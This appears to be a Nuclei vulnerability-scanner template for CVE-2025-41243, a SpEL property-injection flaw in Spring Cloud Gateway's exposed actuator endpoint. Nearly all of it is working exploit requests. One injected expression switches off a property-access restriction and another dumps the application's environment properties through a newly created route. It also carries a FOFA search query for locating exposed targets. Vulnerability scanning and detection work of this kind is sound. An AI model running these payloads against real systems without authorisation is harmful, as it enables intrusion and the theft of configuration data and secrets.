id: CVE-2025-41243

info:
  name: Spring Cloud Gateway - SpEL Property Injection (CVE-2025-41243)
  author: Redmomn
  severity: critical
  description: |
    Spring Cloud Gateway Server Webflux is vulnerable to Spring Environment property modification via SpEL injection.
    An application is vulnerable when all of the following are true:
    * The application uses Spring Cloud Gateway Server Webflux (WebMVC is not vulnerable)
    * Spring Boot actuator is a dependency
    * The Gateway actuator endpoint is enabled via management.endpoints.web.exposure.include=gateway
    * The actuator endpoints are accessible to attackers
    * The actuator endpoints are unsecured
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-41243
    - https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/
    - https://xz.aliyun.com/news/19006
    - https://spring.io/security/cve-2025-41243
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-41243
    cwe-id: CWE-94
  metadata:
    verified: true
    fofa-query: '((header="Server: Netty@SpringBoot" || (body="Whitelabel Error Page" && body="There was an unexpected error")) && body!="couchdb") || title="SpringBootAdmin-Server" || body="SpringBoot"'
  tags: spring-boot,cve2025
variables:
  ROUTE_1: "{{rand_text_alpha(8)}}"
  ROUTE_2: "{{rand_text_alpha(8)}}"
  rand_str: "{{rand_text_alpha(8)}}"

flow: http(1) && http(2)
http:
  - raw:
      - |-
        POST /actuator/gateway/routes/{{ROUTE_1}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "id": "{{ROUTE_1}}",
          "filters": [
            {
              "name": "AddResponseHeader",
              "args": {
                "value": "#{ @systemProperties['spring. cloud.gateway.restrictive-property-accessor.enabled'] = false}",
                "name": "cmd"
              }
            }
          ],
          "uri": "http://example.com",
          "order": 0
        }
      - |-
        POST /actuator/gateway/refresh HTTP/1.1
        Host: {{Hostname}}
      - |-
        GET /actuator/gateway/routes/{{ROUTE_1}} HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        condition: and
        dsl:
          - status_code_1 == 201 && status_code_2 == 200 && status_code_3 == 200
          - len(body_1) == 0 && len(body_2) == 0 && len(body_3) != 0
          - route_id_1 == ROUTE_1
    extractors:
      - type: json
        name: route_id_1
        part: body_3
        internal: true
        json:
          - .route_id
  - raw:
      - |-
        POST /actuator/gateway/routes/{{ROUTE_2}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "id": "{{ROUTE_2}}",
          "filters": [
            {
              "name": "AddResponseHeader",
              "args": {
                "value": "#{ @environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*' ][0].source.![{#this.getKey+'='+#this.getValue.toString}] }",
                "name": "cmd"
              }
            }
          ],
          "uri": "http://example.com",
          "order": 0
        }
      - |-
        POST /actuator/gateway/refresh HTTP/1.1
        Host: {{Hostname}}
      - |-
        GET /actuator/gateway/routes/{{ROUTE_2}} HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: dsl
        condition: and
        dsl:
          - status_code_1 == 201 && status_code_2 == 200 && status_code_3 == 200
          - len(body_1) == 0 && len(body_2) == 0 && len(body_3) != 0
          - route_id_2 == ROUTE_2
          - contains_all(filters, "spring.cloud.gateway", "logging.level.reactor.netty=")
    extractors:
      - type: json
        name: route_id_2
        part: body_3
        internal: true
        json:
          - .route_id
      - type: json
        name: filters
        part: body_3
        internal: true
        json:
          - .filters
